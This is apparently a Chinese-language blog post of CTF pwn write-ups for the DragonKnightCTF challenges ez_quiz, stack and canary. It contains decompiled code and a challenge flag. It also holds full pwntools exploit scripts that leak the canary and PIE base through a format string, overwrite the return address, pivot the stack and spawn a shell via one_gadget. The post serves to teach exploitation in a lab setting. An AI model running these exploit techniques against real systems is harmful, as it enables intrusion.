<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>DragonKnightCTF_pwn | nyyyddddn</title>
  <meta name="author" content="nyyyddddn">
  
  <meta name="description" content="ez_quiz可以发现程序分三个部分，第一个部分是一个base32的逻辑，第二个是一个表达式计算的逻辑，第三个是格式化字符串漏洞 + 栈溢出的逻辑，要先过了前两个逻辑才会走到存在漏洞的逻辑，程序还存在一个backdoor
int __cdecl main(int argc, const char **argv, const char **envp)
&amp;#123;
    unsigned int v3; &amp;#x2F;&amp;#x2F; eax
    unsigned int v4; &amp;#x2F;&amp;#x2F; eax
    unsigned int v5; &amp;#x2F;&amp;#x2F; eax
    unsigned int v6; &amp;#x2F;&amp;#x2F; eax
    unsigned __int8 v8; &amp;#x2F;&amp;#x2F; [rsp+3h] [rbp-19Dh]
    unsigned __int8 v9; &amp;#x2F;&amp;#x2F; [rsp+4h] [rbp-19Ch]
    unsigned __int8 v10; &amp;#x2F;&amp;#x2F; [rsp+5h] [rbp-19Bh]
    unsigned __int8 v11; &amp;#x2F;&amp;#x2F; [rsp+6h] [rbp-19Ah]
    unsigned __int8 v12; &amp;#x2F;&amp;#x2F; [rsp+7h] [rbp-199h]
    int i; &amp;#x2F;&amp;#x2F; [rsp+8h] [rbp-198h]
    unsigned int v14; &amp;#x2F;&amp;#x2F; [rsp+10h] [rbp-190h]
    unsigned int v15; &amp;#x2F;&amp;#x2F; [rsp+14h] [rbp-18Ch]
    char v16[8]; &amp;#x2F;&amp;#x2F; [rsp+18h] [rbp-188h] BYREF
    char nptr[32]; &amp;#x2F;&amp;#x2F; [rsp+20h] [rbp-180h] BYREF
    char v18[32]; &amp;#x2F;&amp;#x2F; [rsp+40h] [rbp-160h] BYREF
    char v19[32]; &amp;#x2F;&amp;#x2F; [rsp+60h] [rbp-140h] BYREF
    char input_data[64]; &amp;#x2F;&amp;#x2F; [rsp+80h] [rbp-120h] BYREF
    __int64 v21[10]; &amp;#x2F;&amp;#x2F; [rsp+C0h] [rbp-E0h] BYREF
    char v22[136]; &amp;#x2F;&amp;#x2F; [rsp+110h] [rbp-90h] BYREF
    unsigned __int64 v23; &amp;#x2F;&amp;#x2F; [rsp+198h] [rbp-8h]

    v23 &amp;#x3D; __readfsqword(0x28u);
    init(argc, argv, envp);
    signal(14, handler);
    v9 &amp;#x3D; 0;
    v10 &amp;#x3D; 0;
    v11 &amp;#x3D; 0;
    v12 &amp;#x3D; 0;
    qmemcpy(v21, &amp;quot;XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC&amp;quot;, sizeof(v21));
    v3 &amp;#x3D; time(0LL);
    srand(v3);
    v8 &amp;#x3D; rand() % 256;
    chal1(input_data, 64);
    if ( strlen(input_data) &amp;gt; 0x32 )
    &amp;#123;
        strcpy(v22, &amp;quot;Out of length.\n&amp;quot;);
        v4 &amp;#x3D; strlen(v22);
        wr1te(1LL, v22, v4);
        exit(1);
    &amp;#125;
    encode(input_data, (__int64)v22);
    for ( i &amp;#x3D; 0; i &amp;lt; 160; ++i )
    &amp;#123;
        v8 &amp;#x3D; lfsr_h(v8);
        if ( i &amp;#x3D;&amp;#x3D; 156 )
            v12 &amp;#x3D; v8;
        if ( i &amp;#x3D;&amp;#x3D; 157 )
            v11 &amp;#x3D; v8;
        if ( i &amp;#x3D;&amp;#x3D; 158 )
            v10 &amp;#x3D; v8;
        if ( i &amp;#x3D;&amp;#x3D; 159 )
            v9 &amp;#x3D; v8;
    &amp;#125;
    if ( (unsigned int)cmp((__int64)v22, (__int64)v21, 0x50uLL) )
    &amp;#123;
        strcpy(v16, &amp;quot;Right!\n&amp;quot;);
        alarm(2u);
        v5 &amp;#x3D; strlen(v16);
        wr1te(1LL, v16, v5);
        strcpy(v19, &amp;quot;Please solve this calculation:\n&amp;quot;);
        v14 &amp;#x3D; (v9 - v10) * v11 % v12;
        printf(&amp;quot;(( %d - %d ) * %d ) %% %d&amp;#x3D;?\n&amp;quot;, v9, v10, v11, v12);
        fgets(nptr, 20, stdin);
        alarm(0);
        v15 &amp;#x3D; atoi(nptr);
        if ( v15 !&amp;#x3D; v14 )
        &amp;#123;
            printf(&amp;quot;You input:%d , but answer:%d&amp;quot;, v15, v14);
            exit(1);
        &amp;#125;
        strcpy(v18, &amp;quot;Right! Here&amp;#39;s your gift:\n&amp;quot;);
        v6 &amp;#x3D; strlen(v18);
        wr1te(1LL, v18, v6);
        gift();
    &amp;#125;
    else
    &amp;#123;
        puts(&amp;quot;Not Right&amp;quot;);
    &amp;#125;
    return 0;
&amp;#125;

__int64 gift()
&amp;#123;
    char format[40]; &amp;#x2F;&amp;#x2F; [rsp+0h] [rbp-30h] BYREF
    unsigned __int64 v2; &amp;#x2F;&amp;#x2F; [rsp+28h] [rbp-8h]

    v2 &amp;#x3D; __readfsqword(0x28u);
    gets(format);
    printf(format);
    fflush(stdout);
    return gets(format);
&amp;#125;

base32decode 得到token是DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}
#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;string.h&amp;gt;
#include &amp;lt;stdlib.h&amp;gt;

static const char base32_alphabet[] &amp;#x3D; &amp;quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&amp;quot;;

int base32_lookup(char c) &amp;#123;
    if (c &amp;gt;&amp;#x3D; &amp;#39;A&amp;#39; &amp;amp;&amp;amp; c &amp;lt;&amp;#x3D; &amp;#39;Z&amp;#39;) return c - &amp;#39;A&amp;#39;;
    if (c &amp;gt;&amp;#x3D; &amp;#39;2&amp;#39; &amp;amp;&amp;amp; c &amp;lt;&amp;#x3D; &amp;#39;7&amp;#39;) return c - &amp;#39;2&amp;#39; + 26;
    return -1;
&amp;#125;

void __fastcall decode(char *encoded, char *decoded) &amp;#123;
    int buffer &amp;#x3D; 0;
    int bits_left &amp;#x3D; 0;
    int count &amp;#x3D; 0;
    int length &amp;#x3D; strlen(encoded);

    for (int i &amp;#x3D; 0; i &amp;lt; length; i++) &amp;#123;
        if (encoded[i] &amp;#x3D;&amp;#x3D; &amp;#39;&amp;#x3D;&amp;#39;) break; &amp;#x2F;&amp;#x2F; Padding character

        int val &amp;#x3D; base32_lookup(encoded[i]);
        if (val &amp;#x3D;&amp;#x3D; -1) continue; &amp;#x2F;&amp;#x2F; Skip invalid characters

        buffer &amp;#x3D; (buffer &amp;lt;&amp;lt; 5) | val;
        bits_left +&amp;#x3D; 5;

        if (bits_left &amp;gt;&amp;#x3D; 8) &amp;#123;
            decoded[count++] &amp;#x3D; ~(char)((buffer &amp;gt;&amp;gt; (bits_left - 8)) &amp;amp; 0xFF);
            bits_left -&amp;#x3D; 8;
        &amp;#125;
    &amp;#125;
    decoded[count] &amp;#x3D; &amp;#39;\0&amp;#39;;
&amp;#125;

int main() &amp;#123;
    char encoded[] &amp;#x3D; &amp;quot;XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC&amp;quot;; &amp;#x2F;&amp;#x2F; Example encoded string
    char decoded[256];

    decode(encoded, decoded);

    printf(&amp;quot;Decoded: %s\n&amp;quot;, decoded);

    return 0;
&amp;#125;

式化字符串泄露canary和 elf相关的地址后，计算出backdoor的地址，之后栈溢出覆盖返回地址为backdoor就好了
exp:
from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os&amp;#x3D;&amp;#39;linux&amp;#39;, arch&amp;#x3D;&amp;#39;amd64&amp;#39;, log_level&amp;#x3D;&amp;#39;debug&amp;#39;)

is_debug &amp;#x3D; 1
IP &amp;#x3D; &amp;quot;challenge.qsnctf.com&amp;quot;
PORT &amp;#x3D; 30604

elf &amp;#x3D; context.binary &amp;#x3D; ELF(&amp;#39;.&amp;#x2F;attachment&amp;#39;)
libc &amp;#x3D; elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g &amp;#x3D; lambda x: gdb.attach(x)
s &amp;#x3D; lambda x: p.send(x)
sl &amp;#x3D; lambda x: p.sendline(x)
sa &amp;#x3D; lambda x, y: p.sendafter(x, y)
sla &amp;#x3D; lambda x, y: p.sendlineafter(x, y)
r &amp;#x3D; lambda x&amp;#x3D;None: p.recv() if x is None else p.recv(x)
rl &amp;#x3D; lambda: p.recvline()
ru &amp;#x3D; lambda x: p.recvuntil(x)
r_leak_libc_64 &amp;#x3D; lambda: u64(p.recvuntil(b&amp;#39;\x7f&amp;#39;)[-6:].ljust(8, b&amp;#39;\x00&amp;#39;))
r_leak_libc_32 &amp;#x3D; lambda: u32(p.recvuntil(b&amp;#39;\xf7&amp;#39;)[-4:])

p &amp;#x3D; connect()


ru(&amp;quot;Please give me your token: &amp;quot;)

decoded_string &amp;#x3D; &amp;quot;DRKCTF&amp;#123;P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie&amp;#125;&amp;quot;
sl(decoded_string)

ru(&amp;quot;(( &amp;quot;)
a &amp;#x3D; int(ru(&amp;#39;-&amp;#39;)[:-2])
b &amp;#x3D; int(ru(&amp;#39; )&amp;#39;)[:-2])
ru(&amp;#39;* &amp;#39;)
c &amp;#x3D; int(ru(&amp;#39; )&amp;#39;)[:-2])
ru(&amp;#39;% &amp;#39;)
d &amp;#x3D; int(ru(&amp;#39;&amp;#x3D;&amp;#39;)[:-1])

result &amp;#x3D; ((a - b) * c) %d
sl(str(result))

ru(&amp;quot;Right! Here&amp;#39;s your gift:\n&amp;quot;)

payload &amp;#x3D; &amp;quot;--%11$p---%8$p&amp;quot;
# g(p)
sl(payload)
ru(&amp;#39;--&amp;#39;)
canary &amp;#x3D; int(r(18),16)
ru(&amp;#39;---&amp;#39;)
pie &amp;#x3D; int(r(14),16) - (0x62fadaae3bd7 - 0x62fadaae2000)

success(hex(canary))
success(hex(pie))


backdoor &amp;#x3D; pie + 0x0000000000001426
payload &amp;#x3D; b&amp;#39;a&amp;#39; * 0x28 + p64(canary) + b&amp;#39;a&amp;#39; * 8 + p64(backdoor)
sl(payload)


p.interactive()



stack"> 
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <meta property="og:title" content="DragonKnightCTF_pwn"/>
  <meta property="og:site_name" content="nyyyddddn"/>

  
    <meta property="og:image" content=""/>
  

  
    <link rel="alternative" href="/atom.xml" title="nyyyddddn" type="application/atom+xml">
  
  
    <link href="/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  




<meta name="generator" content="Hexo 6.3.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/">nyyyddddn</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/catergories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		  <li>
			<a href="/atom.xml" title="Subscribe me.">
			  <i class=""></i>RSS
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 


	
		<div class="page-header">
			<h1> DragonKnightCTF_pwn</h1>
		</div>
	



<div class="row post">
	<!-- cols -->
	
	<div id="top_meta"></div>
	<div class="col-md-9">
	

	<!-- content -->
	<div class="mypage">		
	  		

	  <h2 id="ez-quiz"><a href="#ez-quiz" class="headerlink" title="ez_quiz"></a>ez_quiz</h2><p>可以发现程序分三个部分，第一个部分是一个base32的逻辑，第二个是一个表达式计算的逻辑，第三个是格式化字符串漏洞 + 栈溢出的逻辑，要先过了前两个逻辑才会走到存在漏洞的逻辑，程序还存在一个backdoor</p>
<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
    unsigned int v3; &#x2F;&#x2F; eax
    unsigned int v4; &#x2F;&#x2F; eax
    unsigned int v5; &#x2F;&#x2F; eax
    unsigned int v6; &#x2F;&#x2F; eax
    unsigned __int8 v8; &#x2F;&#x2F; [rsp+3h] [rbp-19Dh]
    unsigned __int8 v9; &#x2F;&#x2F; [rsp+4h] [rbp-19Ch]
    unsigned __int8 v10; &#x2F;&#x2F; [rsp+5h] [rbp-19Bh]
    unsigned __int8 v11; &#x2F;&#x2F; [rsp+6h] [rbp-19Ah]
    unsigned __int8 v12; &#x2F;&#x2F; [rsp+7h] [rbp-199h]
    int i; &#x2F;&#x2F; [rsp+8h] [rbp-198h]
    unsigned int v14; &#x2F;&#x2F; [rsp+10h] [rbp-190h]
    unsigned int v15; &#x2F;&#x2F; [rsp+14h] [rbp-18Ch]
    char v16[8]; &#x2F;&#x2F; [rsp+18h] [rbp-188h] BYREF
    char nptr[32]; &#x2F;&#x2F; [rsp+20h] [rbp-180h] BYREF
    char v18[32]; &#x2F;&#x2F; [rsp+40h] [rbp-160h] BYREF
    char v19[32]; &#x2F;&#x2F; [rsp+60h] [rbp-140h] BYREF
    char input_data[64]; &#x2F;&#x2F; [rsp+80h] [rbp-120h] BYREF
    __int64 v21[10]; &#x2F;&#x2F; [rsp+C0h] [rbp-E0h] BYREF
    char v22[136]; &#x2F;&#x2F; [rsp+110h] [rbp-90h] BYREF
    unsigned __int64 v23; &#x2F;&#x2F; [rsp+198h] [rbp-8h]

    v23 &#x3D; __readfsqword(0x28u);
    init(argc, argv, envp);
    signal(14, handler);
    v9 &#x3D; 0;
    v10 &#x3D; 0;
    v11 &#x3D; 0;
    v12 &#x3D; 0;
    qmemcpy(v21, &quot;XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC&quot;, sizeof(v21));
    v3 &#x3D; time(0LL);
    srand(v3);
    v8 &#x3D; rand() % 256;
    chal1(input_data, 64);
    if ( strlen(input_data) &gt; 0x32 )
    &#123;
        strcpy(v22, &quot;Out of length.\n&quot;);
        v4 &#x3D; strlen(v22);
        wr1te(1LL, v22, v4);
        exit(1);
    &#125;
    encode(input_data, (__int64)v22);
    for ( i &#x3D; 0; i &lt; 160; ++i )
    &#123;
        v8 &#x3D; lfsr_h(v8);
        if ( i &#x3D;&#x3D; 156 )
            v12 &#x3D; v8;
        if ( i &#x3D;&#x3D; 157 )
            v11 &#x3D; v8;
        if ( i &#x3D;&#x3D; 158 )
            v10 &#x3D; v8;
        if ( i &#x3D;&#x3D; 159 )
            v9 &#x3D; v8;
    &#125;
    if ( (unsigned int)cmp((__int64)v22, (__int64)v21, 0x50uLL) )
    &#123;
        strcpy(v16, &quot;Right!\n&quot;);
        alarm(2u);
        v5 &#x3D; strlen(v16);
        wr1te(1LL, v16, v5);
        strcpy(v19, &quot;Please solve this calculation:\n&quot;);
        v14 &#x3D; (v9 - v10) * v11 % v12;
        printf(&quot;(( %d - %d ) * %d ) %% %d&#x3D;?\n&quot;, v9, v10, v11, v12);
        fgets(nptr, 20, stdin);
        alarm(0);
        v15 &#x3D; atoi(nptr);
        if ( v15 !&#x3D; v14 )
        &#123;
            printf(&quot;You input:%d , but answer:%d&quot;, v15, v14);
            exit(1);
        &#125;
        strcpy(v18, &quot;Right! Here&#39;s your gift:\n&quot;);
        v6 &#x3D; strlen(v18);
        wr1te(1LL, v18, v6);
        gift();
    &#125;
    else
    &#123;
        puts(&quot;Not Right&quot;);
    &#125;
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<pre class="line-numbers language-none"><code class="language-none">__int64 gift()
&#123;
    char format[40]; &#x2F;&#x2F; [rsp+0h] [rbp-30h] BYREF
    unsigned __int64 v2; &#x2F;&#x2F; [rsp+28h] [rbp-8h]

    v2 &#x3D; __readfsqword(0x28u);
    gets(format);
    printf(format);
    fflush(stdout);
    return gets(format);
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>base32decode 得到token是DRKCTF{P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie}</p>
<pre class="line-numbers language-none"><code class="language-none">#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
#include &lt;stdlib.h&gt;

static const char base32_alphabet[] &#x3D; &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;;

int base32_lookup(char c) &#123;
    if (c &gt;&#x3D; &#39;A&#39; &amp;&amp; c &lt;&#x3D; &#39;Z&#39;) return c - &#39;A&#39;;
    if (c &gt;&#x3D; &#39;2&#39; &amp;&amp; c &lt;&#x3D; &#39;7&#39;) return c - &#39;2&#39; + 26;
    return -1;
&#125;

void __fastcall decode(char *encoded, char *decoded) &#123;
    int buffer &#x3D; 0;
    int bits_left &#x3D; 0;
    int count &#x3D; 0;
    int length &#x3D; strlen(encoded);

    for (int i &#x3D; 0; i &lt; length; i++) &#123;
        if (encoded[i] &#x3D;&#x3D; &#39;&#x3D;&#39;) break; &#x2F;&#x2F; Padding character

        int val &#x3D; base32_lookup(encoded[i]);
        if (val &#x3D;&#x3D; -1) continue; &#x2F;&#x2F; Skip invalid characters

        buffer &#x3D; (buffer &lt;&lt; 5) | val;
        bits_left +&#x3D; 5;

        if (bits_left &gt;&#x3D; 8) &#123;
            decoded[count++] &#x3D; ~(char)((buffer &gt;&gt; (bits_left - 8)) &amp; 0xFF);
            bits_left -&#x3D; 8;
        &#125;
    &#125;
    decoded[count] &#x3D; &#39;\0&#39;;
&#125;

int main() &#123;
    char encoded[] &#x3D; &quot;XOW3JPFLXGCK7TWMX6GMZIGOTK7ZJIELS65KBHU3TOG2BT4ZUDEJPGVATS7JDPVNQ2QL7EM3UCHZNGUC&quot;; &#x2F;&#x2F; Example encoded string
    char decoded[256];

    decode(encoded, decoded);

    printf(&quot;Decoded: %s\n&quot;, decoded);

    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>式化字符串泄露canary和 elf相关的地址后，计算出backdoor的地址，之后栈溢出覆盖返回地址为backdoor就好了</p>
<p>exp:</p>
<pre class="line-numbers language-none"><code class="language-none">from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)

is_debug &#x3D; 1
IP &#x3D; &quot;challenge.qsnctf.com&quot;
PORT &#x3D; 30604

elf &#x3D; context.binary &#x3D; ELF(&#39;.&#x2F;attachment&#39;)
libc &#x3D; elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g &#x3D; lambda x: gdb.attach(x)
s &#x3D; lambda x: p.send(x)
sl &#x3D; lambda x: p.sendline(x)
sa &#x3D; lambda x, y: p.sendafter(x, y)
sla &#x3D; lambda x, y: p.sendlineafter(x, y)
r &#x3D; lambda x&#x3D;None: p.recv() if x is None else p.recv(x)
rl &#x3D; lambda: p.recvline()
ru &#x3D; lambda x: p.recvuntil(x)
r_leak_libc_64 &#x3D; lambda: u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
r_leak_libc_32 &#x3D; lambda: u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])

p &#x3D; connect()


ru(&quot;Please give me your token: &quot;)

decoded_string &#x3D; &quot;DRKCTF&#123;P13@s3_1e@k_thE_addr_0f_7he_cAnARy_@nd_pie&#125;&quot;
sl(decoded_string)

ru(&quot;(( &quot;)
a &#x3D; int(ru(&#39;-&#39;)[:-2])
b &#x3D; int(ru(&#39; )&#39;)[:-2])
ru(&#39;* &#39;)
c &#x3D; int(ru(&#39; )&#39;)[:-2])
ru(&#39;% &#39;)
d &#x3D; int(ru(&#39;&#x3D;&#39;)[:-1])

result &#x3D; ((a - b) * c) %d
sl(str(result))

ru(&quot;Right! Here&#39;s your gift:\n&quot;)

payload &#x3D; &quot;--%11$p---%8$p&quot;
# g(p)
sl(payload)
ru(&#39;--&#39;)
canary &#x3D; int(r(18),16)
ru(&#39;---&#39;)
pie &#x3D; int(r(14),16) - (0x62fadaae3bd7 - 0x62fadaae2000)

success(hex(canary))
success(hex(pie))


backdoor &#x3D; pie + 0x0000000000001426
payload &#x3D; b&#39;a&#39; * 0x28 + p64(canary) + b&#39;a&#39; * 8 + p64(backdoor)
sl(payload)


p.interactive()

<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p>没有泄露地址的逻辑，只能覆盖rbp 和 rbp + 8</p>
<pre class="line-numbers language-none"><code class="language-none">int __cdecl main(int argc, const char **argv, const char **envp)
&#123;
    char buf[256]; &#x2F;&#x2F; [rsp+0h] [rbp-100h] BYREF

    inits();
    puts(&quot;Hello, CTFer, do you know how to stack pivoting?&quot;);
    read(0, buf, 0x110uLL);
    return 0;
&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>但是仔细看的话会发现 通过这段gadget 配合控制rbp，就可以实现任意地址写，并且将栈迁移到一个已知的地址上，通过两次栈迁移就可以实现rop，第一次将rbp设置成bss中地址，ret设置成这个gadget，就会往bss里面写一段数据，写完后又可以leave ret一次。这样就可以实现rop了，同时rbp和rsp是在已知的地址。通过rop泄露libc地址然后回到main上再写一次rop，然后栈迁移过去执行 用system有些问题，直接用libc中的gadget来满足 onegadget的寄存器约束打one gadget就好了</p>
<pre class="line-numbers language-none"><code class="language-none">.text:000000000040119B 48 8D 85 00 FF FF FF          lea     rax, [rbp+buf]
.text:00000000004011A2 BA 10 01 00 00                mov     edx, 110h                       ; nbytes
.text:00000000004011A7 48 89 C6                      mov     rsi, rax                        ; buf
.text:00000000004011AA BF 00 00 00 00                mov     edi, 0                          ; fd
.text:00000000004011AF B8 00 00 00 00                mov     eax, 0
.text:00000000004011B4 E8 C7 FE FF FF                call    _read
.text:00000000004011B4
.text:00000000004011B9 B8 00 00 00 00                mov     eax, 0
.text:00000000004011BE C9                            leave
.text:00000000004011BF C3                            retn
.text:00000000004011BF                               ; &#125; &#x2F;&#x2F; starts at 401176<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>exp</p>
<pre class="line-numbers language-none"><code class="language-none">from pwn import *
# from LibcSearcher import *
import itertools
import ctypes

context(os&#x3D;&#39;linux&#39;, arch&#x3D;&#39;amd64&#39;, log_level&#x3D;&#39;debug&#39;)

is_debug &#x3D; 0
IP &#x3D; &quot;challenge.qsnctf.com&quot;
PORT &#x3D; 31042

elf &#x3D; context.binary &#x3D; ELF(&#39;.&#x2F;pwn&#39;)
libc &#x3D; elf.libc

def connect():
    return remote(IP, PORT) if not is_debug else process()

g &#x3D; lambda x: gdb.attach(x)
s &#x3D; lambda x: p.send(x)
sl &#x3D; lambda x: p.sendline(x)
sa &#x3D; lambda x, y: p.sendafter(x, y)
sla &#x3D; lambda x, y: p.sendlineafter(x, y)
r &#x3D; lambda x&#x3D;None: p.recv() if x is None else p.recv(x)
rl &#x3D; lambda: p.recvline()
ru &#x3D; lambda x: p.recvuntil(x)
r_leak_libc_64 &#x3D; lambda: u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8, b&#39;\x00&#39;))
r_leak_libc_32 &#x3D; lambda: u32(p.recvuntil(b&#39;\xf7&#39;)[-4:])

p &#x3D; connect()



rdi &#x3D; 0x0000000000401210
rsi_r15 &#x3D; 0x0000000000401281
leave_ret &#x3D; 0x00000000004011be
rbp &#x3D; 0x000000000040115d
bss &#x3D; 0x404500

main &#x3D; 0x401176
magic &#x3D; 0x000000000040119B
magic2 &#x3D; 0x4011aa
ret &#x3D; 0x000000000040101a



sa(&quot;Hello, CTFer, do you know how to stack pivoting?&quot;,b&#39;a&#39; * 0x100 + p64(bss + 0x150) + p64(magic))

payload &#x3D; p64(rdi) + p64(elf.got[&#39;puts&#39;]) + p64(elf.plt[&#39;puts&#39;])
payload +&#x3D; p64(main)
payload &#x3D; payload.ljust(0x100,b&#39;\x00&#39;) + p64(0x404550 - 0x8)  + p64(leave_ret)
# g(p)
s(payload)

print(rl())
libc_base &#x3D; u64(r(6).ljust(8,b&#39;\x00&#39;)) - libc.sym[&#39;puts&#39;]
success(hex(libc_base))

binsh &#x3D; libc_base + next(libc.search(b&#39;&#x2F;bin&#x2F;sh&#39;))
system &#x3D; libc_base + libc.sym[&#39;system&#39;]


# 0xe3afe execve(&quot;&#x2F;bin&#x2F;sh&quot;, r15, r12)
# constraints:
#   [r15] &#x3D;&#x3D; NULL || r15 &#x3D;&#x3D; NULL
#   [r12] &#x3D;&#x3D; NULL || r12 &#x3D;&#x3D; NULL

# 0xe3b01 execve(&quot;&#x2F;bin&#x2F;sh&quot;, r15, rdx)
# constraints:
#   [r15] &#x3D;&#x3D; NULL || r15 &#x3D;&#x3D; NULL
#   [rdx] &#x3D;&#x3D; NULL || rdx &#x3D;&#x3D; NULL

# 0xe3b04 execve(&quot;&#x2F;bin&#x2F;sh&quot;, rsi, rdx)
# constraints:
#   [rsi] &#x3D;&#x3D; NULL || rsi &#x3D;&#x3D; NULL
#   [rdx] &#x3D;&#x3D; NULL || rdx &#x3D;&#x3D; NULL


r12_r13_r14_r15 &#x3D; 0x000000000040127c #: pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret


payload &#x3D; p64(r12_r13_r14_r15) + p64(0) + p64(0) + p64(0) + p64(0) + p64(libc_base + 0xe3afe)
payload &#x3D; payload.ljust(0x100,b&#39;b&#39;) + p64(0x404468 - 0x8)  + p64(leave_ret)
# g(p)
sa(&quot;Hello, CTFer, do you know how to stack pivoting?&quot;,payload)


p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="canary"><a href="#canary" class="headerlink" title="canary"></a>canary</h2><p>程序存在canary，存在一个fork的逻辑，可以通过这个fork的逻辑去爆破canary的值，canary的低位是 \x00，所以只需要爆破 256 * 7 次就能得到canary，之后ret2syscall就好了</p>
